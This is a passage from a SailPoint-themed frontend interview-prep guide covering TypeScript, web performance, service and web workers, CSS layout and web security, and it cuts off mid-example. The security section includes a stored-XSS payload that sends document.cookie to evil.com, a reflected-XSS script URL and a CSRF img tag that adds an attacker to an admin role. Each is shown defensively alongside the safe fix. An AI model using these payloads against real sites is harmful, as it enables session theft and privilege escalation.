      return _exhaustive;
  }
}

// TYPE GUARDS — narrow types at runtime

// 1. typeof guard
function processValue(value: string | number) {
  if (typeof value === 'string') {
    return value.toUpperCase(); // TypeScript knows it's string
  }
  return value.toFixed(2); // TypeScript knows it's number
}

// 2. instanceof guard
class ApiError extends Error {
  constructor(public statusCode: number, message: string) {
    super(message);
  }
}

function handleError(error: Error | ApiError) {
  if (error instanceof ApiError) {
    console.log(`API Error ${error.statusCode}: ${error.message}`);
  } else {
    console.log(`Generic Error: ${error.message}`);
  }
}

// 3. Custom type guard (type predicate)
function isIdentity(obj: unknown): obj is Identity {
  return (
    typeof obj === 'object' &&
    obj !== null &&
    'id' in obj &&
    'name' in obj &&
    'riskScore' in obj
  );
}

// 4. Assertion function
function assertIsIdentity(obj: unknown): asserts obj is Identity {
  if (!isIdentity(obj)) {
    throw new Error('Object is not a valid Identity');
  }
}

const data: unknown = await fetchData();
assertIsIdentity(data);
console.log(data.riskScore); // ✅ TypeScript knows it's Identity after assertion
```

**SailPoint Context:** Discriminated unions perfectly model SailPoint's event-driven architecture — different governance events (access requests, certifications, provisioning) share a common structure but have type-specific fields. Type guards ensure safe handling of API responses.

---

### Q16: Explain Declaration Merging and Module Augmentation in TypeScript.

**Answer:**

```typescript
// DECLARATION MERGING — TypeScript merges multiple declarations with the same name

// Interface merging (most common)
interface Identity {
  id: string;
  name: string;
}

interface Identity {
  email: string;
  riskScore: number;
}

// Result: Identity has all four properties
const user: Identity = {
  id: '1', name: 'Alice', email: 'alice@sailpoint.com', riskScore: 42
};

// MODULE AUGMENTATION — extend third-party types
// Augmenting Express Request (common in Node.js backends)
declare module 'express' {
  interface Request {
    user?: {
      id: string;
      tenantId: string;
      permissions: string[];
    };
  }
}

// Augmenting a library's types
declare module 'axios' {
  interface AxiosRequestConfig {
    tenantId?: string;
    retryCount?: number;
  }
}

// GLOBAL AUGMENTATION
declare global {
  interface Window {
    sailpointConfig: {
      apiBaseUrl: string;
      tenantId: string;
      featureFlags: Record<string, boolean>;
    };
  }
}

// Now TypeScript knows about window.sailpointConfig
const apiUrl = window.sailpointConfig.apiBaseUrl;

// Namespace merging with class
class IdentityService {
  getIdentity(id: string) { /* ... */ }
}

namespace IdentityService {
  export interface Config {
    baseUrl: string;
    timeout: number;
  }
  export const DEFAULT_TIMEOUT = 5000;
}

// Both class and namespace members are accessible
const svc = new IdentityService();
const config: IdentityService.Config = {
  baseUrl: '/api/v3',
  timeout: IdentityService.DEFAULT_TIMEOUT
};
```

**SailPoint Context:** Module augmentation is essential when extending SailPoint's SDK types or adding tenant-specific configuration to global types. Declaration merging helps when building plugin systems where different modules contribute to a shared interface.

---

### Q17: Explain Decorators in TypeScript. How are they used?

**Answer:**

Decorators are special declarations that can modify classes, methods, properties, and parameters. They are widely used in Angular (SailPoint's IdentityIQ UI uses AngularJS/Angular).

```typescript
// METHOD DECORATOR — logging and performance tracking
function Log(target: any, propertyKey: string, descriptor: PropertyDescriptor) {
  const original = descriptor.value;

  descriptor.value = function (...args: any[]) {
    console.log(`Calling ${propertyKey} with args:`, args);
    const start = performance.now();
    const result = original.apply(this, args);
    const duration = performance.now() - start;
    console.log(`${propertyKey} completed in ${duration.toFixed(2)}ms`);
    return result;
  };

  return descriptor;
}

// CLASS DECORATOR — add metadata
function ApiController(basePath: string) {
  return function (constructor: Function) {
    constructor.prototype.basePath = basePath;
    constructor.prototype.routes = constructor.prototype.routes || [];
  };
}

// PROPERTY DECORATOR — validation
function MinLength(min: number) {
  return function (target: any, propertyKey: string) {
    let value: string;
    Object.defineProperty(target, propertyKey, {
      get: () => value,
      set: (newValue: string) => {
        if (newValue.length < min) {
          throw new Error(`${propertyKey} must be at least ${min} characters`);
        }
        value = newValue;
      }
    });
  };
}

@ApiController('/api/v3/identities')
class IdentityController {
  @MinLength(3)
  name: string = '';

  @Log
  async fetchIdentity(id: string): Promise<Identity> {
    const response = await fetch(`${this.basePath}/${id}`);
    return response.json();
  }
}
```

**TC39 Stage 3 Decorators (2024+):**
```typescript
// New decorator syntax (different from legacy/experimental)
function logged(originalMethod: any, context: ClassMethodDecoratorContext) {
  return function (...args: any[]) {
    console.log(`Calling ${String(context.name)}`);
    return originalMethod.call(this, ...args);
  };
}
```

**SailPoint Context:** Angular heavily uses decorators (`@Component`, `@Injectable`, `@Input`, `@Output`). Understanding decorators is critical for SailPoint's Angular-based IdentityNow UI and for building custom decorators for audit logging, permission checks, and API caching.

---

### Q18: Explain the difference between `unknown`, `any`, and `never` in TypeScript.

**Answer:**

```typescript
// ANY — opts out of type checking entirely (escape hatch)
let dangerous: any = 'hello';
dangerous.foo.bar.baz(); // No error at compile time — crashes at runtime!
dangerous = 42;
dangerous = { x: 1 };
// ⚠️ Avoid `any` — it defeats the purpose of TypeScript

// UNKNOWN — type-safe counterpart of `any`
let safe: unknown = 'hello';
// safe.toUpperCase();  // ❌ Error: Object is of type 'unknown'

// Must narrow before use
if (typeof safe === 'string') {
  safe.toUpperCase(); // ✅ Now TypeScript knows it's a string
}

// Real-world: safe API response handling
async function fetchData(url: string): Promise<unknown> {
  const response = await fetch(url);
  return response.json(); // Returns unknown instead of any
}

const data = await fetchData('/api/v3/identities/123');
// Must validate before using
if (isIdentity(data)) {
  console.log(data.riskScore); // ✅ Safe after type guard
}

// NEVER — represents values that never occur
// 1. Function that never returns
function throwError(message: string): never {
  throw new Error(message);
}

// 2. Exhaustiveness checking
type Shape = 'circle' | 'square' | 'triangle';

function getArea(shape: Shape): number {
  switch (shape) {
    case 'circle': return Math.PI * 10 * 10;
    case 'square': return 10 * 10;
    case 'triangle': return (10 * 10) / 2;
    default:
      const _exhaustive: never = shape;
      // If you add 'rectangle' to Shape but forget to handle it,
      // TypeScript errors here: Type 'string' is not assignable to type 'never'
      return _exhaustive;
  }
}

// 3. Impossible type intersections
type Impossible = string & number; // never
```

| Type | Assignable FROM | Assignable TO | Type checking | Use case |
|------|:-:|:-:|:-:|---|
| `any` | Everything | Everything | ❌ None | Migration, escape hatch |
| `unknown` | Everything | Only after narrowing | ✅ Strict | Safe external data |
| `never` | Nothing | Everything | ✅ Strict | Exhaustiveness, errors |

**SailPoint Context:** When consuming SailPoint's REST APIs, always type responses as `unknown` (not `any`) and validate with type guards. This prevents runtime errors when API responses change or contain unexpected data — critical for L3 support stability.

---

## Section 3: Web Performance & Core Web Vitals

### Q19: Explain Core Web Vitals — LCP, FID/INP, and CLS. How do you optimize each?

**Answer:**

Core Web Vitals are Google's metrics for measuring real-world user experience:

**1. LCP (Largest Contentful Paint) — Loading Performance**
- Measures when the largest visible content element finishes rendering
- Target: ≤ 2.5 seconds
- Common culprits: large images, web fonts, render-blocking resources

```html
<!-- Optimization strategies -->

<!-- Preload critical resources -->
<link rel="preload" href="/hero-image.webp" as="image" />
<link rel="preload" href="/fonts/sailpoint-icons.woff2" as="font" crossorigin />

<!-- Inline critical CSS -->
<style>
  /* Critical above-the-fold styles inlined in <head> */
  .dashboard-header { display: flex; height: 64px; }
  .identity-summary { padding: 16px; }
</style>

<!-- Defer non-critical CSS -->
<link rel="preload" href="/styles/full.css" as="style"
      onload="this.onload=null;this.rel='stylesheet'" />
```

```javascript
// Measure LCP programmatically
new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lastEntry = entries[entries.length - 1];
  console.log('LCP:', lastEntry.startTime, lastEntry.element);
}).observe({ type: 'largest-contentful-paint', buffered: true });
```

**2. INP (Interaction to Next Paint) — Responsiveness** (replaced FID in March 2024)
- Measures the latency of ALL interactions (clicks, taps, key presses) throughout the page lifecycle
- Target: ≤ 200ms
- FID only measured the first interaction; INP measures the worst interaction

```javascript
// Break up long tasks to improve INP
// BAD: Long synchronous task blocks main thread
function processAllIdentities(identities) {
  identities.forEach(identity => {
    computeRiskScore(identity);      // 50ms
    updateEntitlements(identity);     // 30ms
    renderIdentityCard(identity);     // 20ms
  }); // Total: 100ms × N identities — blocks UI!
}

// GOOD: Yield to main thread between chunks
async function processIdentitiesChunked(identities, chunkSize = 10) {
  for (let i = 0; i < identities.length; i += chunkSize) {
    const chunk = identities.slice(i, i + chunkSize);
    chunk.forEach(identity => {
      computeRiskScore(identity);
      updateEntitlements(identity);
      renderIdentityCard(identity);
    });

    // Yield to main thread — allows browser to handle user input
    await new Promise(resolve => setTimeout(resolve, 0));
    // Or use scheduler.yield() when available:
    // await scheduler.yield();
  }
}
```

**3. CLS (Cumulative Layout Shift) — Visual Stability**
- Measures unexpected layout shifts during page load
- Target: ≤ 0.1
- Common culprits: images without dimensions, dynamic content injection, web fonts

```html
<!-- Always set dimensions on images/videos -->
<img src="avatar.webp" width="48" height="48" alt="User avatar" />

<!-- Use aspect-ratio for responsive images -->
<style>
  .identity-avatar {
    aspect-ratio: 1 / 1;
    width: 100%;
    max-width: 48px;
  }

  /* Reserve space for dynamic content */
  .notification-banner {
    min-height: 48px; /* Prevents shift when banner loads */
  }

  /* Font display swap to prevent FOIT */
  @font-face {
    font-family: 'SailPointIcons';
    src: url('/fonts/sailpoint-icons.woff2') format('woff2');
    font-display: swap;
  }
</style>
```

**SailPoint Context:** SailPoint's IdentityNow dashboard loads multiple widgets (identity summary, pending certifications, access requests, risk scores). Optimizing LCP for the main dashboard widget, INP for certification review interactions, and CLS for dynamically loaded identity cards is critical for enterprise user experience.

---

### Q20: Explain the Critical Rendering Path and how to optimize it.

**Answer:**

The Critical Rendering Path (CRP) is the sequence of steps the browser takes to convert HTML, CSS, and JavaScript into pixels on screen:

```
HTML → DOM Tree
                 ↘
                   Render Tree → Layout → Paint → Composite
                 ↗
CSS  → CSSOM Tree

JavaScript can modify both DOM and CSSOM (render-blocking)
```

**Steps:**
1. **Parse HTML** → Build DOM tree
2. **Parse CSS** → Build CSSOM tree
3. **Combine** → Render Tree (only visible elements)
4. **Layout** → Calculate geometry (position, size)
5. **Paint** → Fill in pixels (colors, borders, shadows)
6. **Composite** → Layer composition (GPU-accelerated)

**Optimization Strategies:**

```html
<!-- 1. Minimize critical resources -->
<!-- Inline critical CSS in <head> -->
<style>/* Only above-the-fold styles */</style>

<!-- 2. Defer non-critical JS -->
<script src="analytics.js" defer></script>
<script src="dashboard-widgets.js" async></script>

<!-- 3. Preconnect to required origins -->
<link rel="preconnect" href="https://api.sailpoint.com" />
<link rel="dns-prefetch" href="https://cdn.sailpoint.com" />

<!-- 4. Preload critical resources -->
<link rel="preload" href="/fonts/main.woff2" as="font" crossorigin />
<link rel="preload" href="/api/v3/identities/me" as="fetch" crossorigin />
```

```javascript
// 5. Code splitting — load only what's needed
const CertificationReview = React.lazy(
  () => import('./CertificationReview')
);

// 6. Avoid layout thrashing (forced synchronous layout)
// BAD — reads then writes in a loop
elements.forEach(el => {
  const height = el.offsetHeight;    // READ (forces layout)
  el.style.height = height + 10 + 'px'; // WRITE (invalidates layout)
});

// GOOD — batch reads, then batch writes
const heights = elements.map(el => el.offsetHeight); // All reads
elements.forEach((el, i) => {
  el.style.height = heights[i] + 10 + 'px'; // All writes
});
```

---

### Q21: Explain Resource Hints — preload, prefetch, preconnect, and dns-prefetch.

**Answer:**

```html
<!-- 1. PRELOAD — fetch critical resources for CURRENT page (high priority) -->
<!-- Use for: fonts, hero images, critical CSS/JS needed immediately -->
<link rel="preload" href="/fonts/sailpoint-icons.woff2" as="font"
      type="font/woff2" crossorigin />
<link rel="preload" href="/api/v3/identities/me" as="fetch" crossorigin />
<link rel="preload" href="/critical.css" as="style" />

<!-- 2. PREFETCH — fetch resources for FUTURE navigation (low priority, idle time) -->
<!-- Use for: next page resources, likely navigation targets -->
<link rel="prefetch" href="/dashboard/certifications" />
<link rel="prefetch" href="/js/certification-review.chunk.js" />

<!-- 3. PRECONNECT — establish early connection (DNS + TCP + TLS) -->
<!-- Use for: known third-party origins you'll fetch from soon -->
<link rel="preconnect" href="https://api.identitynow.com" />
<link rel="preconnect" href="https://cdn.sailpoint.com" crossorigin />

<!-- 4. DNS-PREFETCH — resolve DNS only (lighter than preconnect) -->
<!-- Use for: origins you might need, less certain than preconnect -->
<link rel="dns-prefetch" href="https://analytics.sailpoint.com" />
```

| Hint | Priority | When fetched | Use case |
|------|----------|-------------|----------|
| `preload` | High | Immediately | Current page critical resources |
| `prefetch` | Low | Idle time | Next page resources |
| `preconnect` | High | Immediately | Known API/CDN origins |
| `dns-prefetch` | Low | Immediately | Possible future origins |

```javascript
// Dynamic preloading based on user behavior
function preloadOnHover(link) {
  link.addEventListener('mouseenter', () => {
    const prefetchLink = document.createElement('link');
    prefetchLink.rel = 'prefetch';
    prefetchLink.href = link.href;
    document.head.appendChild(prefetchLink);
  }, { once: true });
}

// Preload next likely page in SailPoint workflow
// User is on access request form → preload review page
if (currentPage === 'access-request-form') {
  const link = document.createElement('link');
  link.rel = 'prefetch';
  link.href = '/access-request/review';
  document.head.appendChild(link);
}
```

---

### Q22: Explain Service Workers and Caching Strategies.

**Answer:**

A Service Worker is a script that runs in the background, separate from the web page, enabling offline support, push notifications, and advanced caching.

```javascript
// service-worker.js — Registration
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js', { scope: '/' })
    .then(reg => console.log('SW registered:', reg.scope))
    .catch(err => console.error('SW registration failed:', err));
}

// CACHING STRATEGIES:

// 1. Cache First (Cache Falling Back to Network)
// Best for: static assets, fonts, images
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then(cached => {
      return cached || fetch(event.request).then(response => {
        const clone = response.clone();
        caches.open('static-v1').then(cache => cache.put(event.request, clone));
        return response;
      });
    })
  );
});

// 2. Network First (Network Falling Back to Cache)
// Best for: API calls, frequently updated data
self.addEventListener('fetch', (event) => {
  if (event.request.url.includes('/api/')) {
    event.respondWith(
      fetch(event.request)
        .then(response => {
          const clone = response.clone();
          caches.open('api-v1').then(cache => cache.put(event.request, clone));
          return response;
        })
        .catch(() => caches.match(event.request))
    );
  }
});
```javascript
// 3. Stale While Revalidate
// Best for: data that can be slightly stale (user profiles, config)
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.open('swr-cache').then(cache => {
      return cache.match(event.request).then(cached => {
        const fetchPromise = fetch(event.request).then(response => {
          cache.put(event.request, response.clone());
          return response;
        });
        return cached || fetchPromise;
      });
    })
  );
});

// 4. Cache Only — for app shell
// 5. Network Only — for non-cacheable requests (POST, auth)
```

| Strategy | Offline Support | Freshness | Speed | Use Case |
|----------|:-:|:-:|:-:|---|
| Cache First | ✅ | Low | Fast | Static assets, fonts |
| Network First | ✅ (fallback) | High | Slower | API data, dynamic content |
| Stale While Revalidate | ✅ | Medium | Fast | User profiles, config |
| Cache Only | ✅ | None | Fastest | App shell |
| Network Only | ❌ | Highest | Varies | Auth, POST requests |

**SailPoint Context:** For IdentityNow's admin console, a Service Worker with "Stale While Revalidate" for identity lists and "Network First" for certification decisions ensures the app remains usable during network issues while keeping governance data fresh.

---

### Q23: Explain Web Workers and when to use them for heavy computation.

**Answer:**

Web Workers run JavaScript in a background thread, keeping the main thread free for UI interactions.

```javascript
// main.js — Creating and communicating with a Web Worker
const worker = new Worker('/workers/risk-calculator.js');

// Send data to worker
worker.postMessage({
  identities: largeIdentityList, // 10,000+ identities
  rules: riskScoringRules
});

// Receive results from worker
worker.onmessage = (event) => {
  const { scoredIdentities, stats } = event.data;
  renderRiskDashboard(scoredIdentities);
  updateStats(stats);
};

worker.onerror = (error) => {
  console.error('Worker error:', error.message);
};
```javascript
// workers/risk-calculator.js — Worker script
self.onmessage = (event) => {
  const { identities, rules } = event.data;

  const scoredIdentities = identities.map(identity => {
    let riskScore = 0;

    // Heavy computation — doesn't block UI
    rules.forEach(rule => {
      if (rule.condition(identity)) {
        riskScore += rule.weight;
      }
    });

    // Check for toxic combinations (SoD violations)
    const toxicCombos = findToxicEntitlementCombinations(identity.entitlements);
    riskScore += toxicCombos.length * 15;

    return { ...identity, riskScore: Math.min(riskScore, 100) };
  });

  const stats = {
    highRisk: scoredIdentities.filter(i => i.riskScore > 75).length,
    mediumRisk: scoredIdentities.filter(i => i.riskScore > 40 && i.riskScore <= 75).length,
    lowRisk: scoredIdentities.filter(i => i.riskScore <= 40).length
  };

  self.postMessage({ scoredIdentities, stats });
};

// SharedWorker — shared across multiple tabs
// Useful for: shared state, single WebSocket connection
const shared = new SharedWorker('/workers/shared-notifications.js');
shared.port.onmessage = (event) => {
  showNotification(event.data);
};
shared.port.start();
```

**Limitations:**
- No DOM access (use `postMessage` to communicate)
- No `window`, `document`, or `parent` objects
- Data is copied (structured clone), not shared (unless using `SharedArrayBuffer`)
- Separate file required (or use Blob URL for inline workers)

**SailPoint Context:** Risk score calculation across thousands of identities, Separation of Duties (SoD) violation detection, and bulk entitlement analysis are perfect Web Worker candidates — they involve heavy computation that would freeze the UI if run on the main thread.

---

### Q24: Explain image optimization strategies for web applications.

**Answer:**

```html
<!-- 1. RESPONSIVE IMAGES with srcset and sizes -->
<img
  src="identity-dashboard-800.webp"
  srcset="
    identity-dashboard-400.webp 400w,
    identity-dashboard-800.webp 800w,
    identity-dashboard-1200.webp 1200w,
    identity-dashboard-1600.webp 1600w
  "
  sizes="(max-width: 600px) 100vw,
         (max-width: 1200px) 50vw,
         800px"
  alt="Identity governance dashboard"
  loading="lazy"
  decoding="async"
  width="800"
  height="450"
/>

<!-- 2. MODERN FORMATS with fallback -->
<picture>
  <source srcset="chart.avif" type="image/avif" />
  <source srcset="chart.webp" type="image/webp" />
  <img src="chart.png" alt="Risk score distribution chart"
       loading="lazy" width="600" height="400" />
</picture>

<!-- 3. LAZY LOADING — native browser support -->
<img src="avatar.webp" loading="lazy" alt="User avatar" />
<!-- loading="eager" for above-the-fold images (default) -->

<!-- 4. FETCH PRIORITY for critical images -->
<img src="hero-banner.webp" fetchpriority="high" alt="Dashboard hero" />
<img src="footer-logo.webp" fetchpriority="low" alt="Company logo" />
```

```javascript
// 5. Intersection Observer for custom lazy loading
const imageObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      img.classList.remove('lazy');
      imageObserver.unobserve(img);
    }
  });
}, { rootMargin: '200px' }); // Start loading 200px before visible

document.querySelectorAll('img.lazy').forEach(img => {
  imageObserver.observe(img);
});
```

| Format | Compression | Browser Support | Best For |
|--------|:-:|:-:|---|
| AVIF | Best (50% smaller than JPEG) | Chrome, Firefox, Safari 16.4+ | Photos, complex images |
| WebP | Great (25-35% smaller than JPEG) | All modern browsers | General purpose |
| SVG | N/A (vector) | All browsers | Icons, logos, illustrations |
| PNG | Lossless | All browsers | Screenshots, transparency |
| JPEG | Good | All browsers | Photos (legacy fallback) |

**SailPoint Context:** SailPoint's dashboards display user avatars, org charts, and data visualization charts. Using WebP/AVIF for avatars, SVG for icons and charts, and lazy loading for below-the-fold identity cards significantly reduces initial page weight.

---

## Section 4: Web Security

### Q25: Explain XSS (Cross-Site Scripting) — types and prevention strategies.

**Answer:**

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

**Types of XSS:**

**1. Stored (Persistent) XSS** — malicious script saved in database
```javascript
// ATTACK: Attacker saves this as their "display name" in identity profile
const maliciousName = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';

// VULNERABLE CODE:
element.innerHTML = `Welcome, ${user.displayName}`; // ❌ Executes script!

// SAFE CODE:
element.textContent = `Welcome, ${user.displayName}`; // ✅ Escaped
```

**2. Reflected XSS** — malicious script in URL parameters
```javascript
// ATTACK URL: https://identitynow.com/search?q=<script>alert('xss')</script>

// VULNERABLE:
const query = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = `Results for: ${query}`; // ❌

// SAFE:
document.getElementById('results').textContent = `Results for: ${query}`; // ✅
```

**3. DOM-based XSS** — manipulation happens entirely in the browser
```javascript
// VULNERABLE:
document.getElementById('output').innerHTML = location.hash.slice(1); // ❌

// SAFE:
document.getElementById('output').textContent = location.hash.slice(1); // ✅
```

**Prevention Strategies:**

```javascript
// 1. NEVER use innerHTML with user data
element.textContent = userInput; // Safe — auto-escapes HTML

// 2. Sanitize HTML when rich text is needed
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});

// 3. Use framework's built-in escaping (React auto-escapes by default)
// React JSX is safe:
return <div>{userInput}</div>; // ✅ Auto-escaped

// But dangerouslySetInnerHTML bypasses it:
return <div dangerouslySetInnerHTML={{ __html: userInput }} />; // ❌ DANGEROUS

// 4. Content Security Policy header (server-side)
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123';
//   style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;

// 5. HTTP-only cookies (prevent JS access)
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// 6. Input validation and encoding
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
```

**SailPoint Context:** XSS is a critical concern in identity governance platforms. If an attacker injects script into an identity's display name or description, it could execute when an admin reviews that identity — potentially stealing admin session tokens and gaining unauthorized access to governance controls.

---

### Q26: Explain CSRF (Cross-Site Request Forgery) and prevention strategies.

**Answer:**

CSRF tricks an authenticated user's browser into making unwanted requests to a site where they're logged in.

```
Attack Flow:
1. User logs into identitynow.com (session cookie set)
2. User visits evil.com (in another tab)
3. evil.com contains: <img src="https://identitynow.com/api/v3/roles/admin/members?add=attacker">
4. Browser sends request WITH the user's session cookie
5. Server processes it as a legitimate request
```

**Prevention Strategies:**

```javascript
// 1. CSRF Token (Synchronizer Token Pattern)
// Server generates unique token per session, embedded in forms
<form action="/api/v3/access-requests" method="POST">
  <input type="hidden" name="_csrf" value="unique-random-token-abc123" />
  <!-- form fields -->
</form>

// For AJAX requests — send token in header
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/v3/access-requests', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken  // Server validates this
  },
  body: JSON.stringify(requestData)
});

// 2. SameSite Cookie attribute
// Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
// Strict: Cookie never sent cross-site
// Lax: Cookie sent on top-level GET navigations only
// None: Cookie sent everywhere (requires Secure)

// 3. Double Submit Cookie Pattern
// Set a random value in both cookie AND request header
// Server verifies they match (attacker can't read cookies from another origin)

// 4. Check Origin/Referer headers (server-side)
// Verify request comes from your own domain

// 5. Custom request headers (AJAX-only endpoints)
// Browsers don't allow custom headers in cross-origin simple requests
// If endpoint requires 'X-Requested-With: XMLHttpRequest', simple CSRF fails
```

**SailPoint Context:** CSRF protection is paramount in SailPoint — imagine an attacker tricking an admin into approving an access request or modifying a governance policy. SailPoint uses CSRF tokens in all state-changing API calls and enforces SameSite cookie policies.

---

### Q27: Explain Content Security Policy (CSP) and how to implement it.

**Answer:**

CSP is an HTTP header that tells the browser which sources of content are allowed, preventing XSS and data injection attacks.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' https://cdn.sailpoint.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://avatars.sailpoint.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.identitynow.com wss://notifications.sailpoint.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
```

```javascript
// Using nonce for inline scripts (preferred over 'unsafe-inline')
// Server generates random nonce per request
<script nonce="r4nd0m">
  // This script is allowed because nonce matches CSP header
  initializeApp();
</script>

// Report-Only mode for testing (doesn't block, just reports)
// Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

// CSP via meta tag (limited — can't use report-uri or frame-ancestors)
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'" />
```

| Directive | Controls | Example |
|-----------|----------|---------|
| `default-src` | Fallback for all | `'self'` |
| `script-src` | JavaScript sources | `'self' 'nonce-abc'` |
| `style-src` | CSS sources | `'self' 'unsafe-inline'` |
| `connect-src` | AJAX, WebSocket, fetch | `'self' https://api.example.com` |
| `img-src` | Image sources | `'self' data: https:` |
| `frame-ancestors` | Who can embed (replaces X-Frame-Options) | `'none'` |

**SailPoint Context:** CSP is critical for SailPoint's multi-tenant SaaS platform. Each tenant's CSP should restrict script sources to prevent injected scripts from exfiltrating identity data. `connect-src` must whitelist only SailPoint's API endpoints.

---

### Q28: Explain CORS — how it works, preflight requests, and common issues.

**Answer:**

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls which origins can access resources from another origin.

```
Same Origin: protocol + host + port must match
https://app.sailpoint.com:443  ← origin

Cross-origin examples:
- https://api.sailpoint.com     ← different host
- http://app.sailpoint.com      ← different protocol
- https://app.sailpoint.com:8080 ← different port
```

**Simple Requests vs Preflight Requests:**

```javascript
// SIMPLE REQUEST — no preflight needed
// Conditions: GET/HEAD/POST, standard headers, standard content types
fetch('https://api.sailpoint.com/v3/identities', {
  method: 'GET',
  headers: { 'Accept': 'application/json' }
});
// Browser sends request directly with Origin header
// Server responds with Access-Control-Allow-Origin

// PREFLIGHT REQUEST — browser sends OPTIONS first
// Triggered by: PUT/DELETE/PATCH, custom headers, application/json
fetch('https://api.sailpoint.com/v3/access-requests', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',    // triggers preflight
    'Authorization': 'Bearer jwt-token',    // custom header
    'X-Tenant-Id': 'acme-corp'            // custom header
  },
  body: JSON.stringify({ requestedItems: ['role-123'] })
});

// Preflight OPTIONS request (sent automatically by browser):
// OPTIONS /v3/access-requests HTTP/1.1
// Origin: https://app.sailpoint.com
// Access-Control-Request-Method: POST
// Access-Control-Request-Headers: Content-Type, Authorization, X-Tenant-Id

// Server preflight response:
// Access-Control-Allow-Origin: https://app.sailpoint.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
// Access-Control-Allow-Headers: Content-Type, Authorization, X-Tenant-Id
// Access-Control-Max-Age: 86400  (cache preflight for 24 hours)
// Access-Control-Allow-Credentials: true
```

**Common CORS Issues and Fixes:**

```javascript
// Issue 1: Credentials with wildcard origin
// ❌ Access-Control-Allow-Origin: * (can't use with credentials)
// ✅ Access-Control-Allow-Origin: https://app.sailpoint.com

// Issue 2: Missing headers in Allow-Headers
// If you send custom headers, they MUST be listed in Allow-Headers

// Issue 3: Opaque responses in Service Workers
// fetch with mode: 'no-cors' returns opaque response (can't read body)

// Proxy pattern for development
// vite.config.ts
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://api.identitynow.com',
        changeOrigin: true,
        secure: true
      }
    }
  }
};
```

**JWT Authentication Flow (bonus — commonly asked with CORS):**

```
1. User submits credentials → POST /auth/login
2. Server validates → returns JWT { access_token, refresh_token }
3. Client stores tokens (httpOnly cookie or memory — NOT localStorage)
4. Client sends: Authorization: Bearer <access_token> on each request
5. Server validates JWT signature + expiry
6. On 401 → use refresh_token to get new access_token
7. On refresh failure → redirect to login
```

**SailPoint Context:** SailPoint IdentityNow is a multi-tenant SaaS platform. CORS must be configured per-tenant to allow only that tenant's subdomain (e.g., `https://acme.identitynow.com`). JWT tokens carry tenant context and identity permissions for API authorization.

---

## Section 5: CSS & Layout

### Q29: Explain CSS Specificity and the Cascade. How are conflicts resolved?

**Answer:**

CSS Specificity determines which styles win when multiple rules target the same element. It's calculated as a tuple: `(inline, IDs, classes/attributes/pseudo-classes, elements/pseudo-elements)`.

```css
/* Specificity: (0, 0, 0, 1) — element selector */
p { color: black; }

/* Specificity: (0, 0, 1, 0) — class selector */
.identity-name { color: blue; }

/* Specificity: (0, 0, 1, 1) — class + element */
p.identity-name { color: green; }

/* Specificity: (0, 1, 0, 0) — ID selector */
#main-identity { color: red; }

/* Specificity: (0, 1, 1, 1) — ID + class + element */
p#main-identity.highlighted { color: purple; }

/* Specificity: (1, 0, 0, 0) — inline style (highest) */
/* <p style="color: orange"> */

/* !important overrides everything (avoid in production) */
.override { color: pink !important; }
```

**Cascade Resolution Order (highest to lowest):**
1. `!important` declarations (user-agent → user → author)
2. Inline styles
3. ID selectors
4. Class selectors, attribute selectors, pseudo-classes
5. Element selectors, pseudo-elements
6. Universal selector (`*`), combinators, `:where()` (0 specificity)
7. Inherited styles
8. Browser defaults

```css
/* Modern specificity control */

/* :where() — zero specificity (great for resets/defaults) */
:where(.identity-card) { padding: 16px; } /* (0,0,0,0) */

/* :is() — takes highest specificity of its arguments */
:is(#sidebar, .main) .title { color: blue; } /* (0,1,0,1) from #sidebar */

/* @layer — cascade layers (CSS Cascade Layers) */
@layer base, components, utilities;

@layer base {
  .btn { padding: 8px 16px; }
}
@layer components {
  .btn { padding: 12px 24px; } /* Wins over base layer */
}
@layer utilities {
  .p-4 { padding: 16px !important; } /* Wins over components */
}
```

---

### Q30: Flexbox vs Grid — when to use each? Provide layout examples.

**Answer:**

**Flexbox** = 1-dimensional (row OR column). **Grid** = 2-dimensional (rows AND columns).

```css
/* FLEXBOX — Navigation bar, toolbar, card row */
.identity-toolbar {
  display: flex;
  justify-content: space-between; /* main axis */
  align-items: center;            /* cross axis */
  gap: 12px;
  flex-wrap: wrap;
}

.toolbar-actions {
  display: flex;
  gap: 8px;
}

/* Flex item sizing */
.search-input {
  flex: 1 1 300px; /* grow, shrink, basis */
  /* flex: 1 = flex: 1 1 0% (grow equally) */
  min-width: 0; /* Important: prevents overflow in flex items */
}

/* GRID — Dashboard layout, data tables, card grids */
.identity-dashboard {
  display: grid;
  grid-template-columns: 250px 1fr 300px; /* sidebar, main, panel */
  grid-template-rows: 64px 1fr 48px;      /* header, content, footer */
  grid-template-areas:
    "header  header  header"
    "sidebar main   panel"
    "footer  footer  footer";
  gap: 16px;
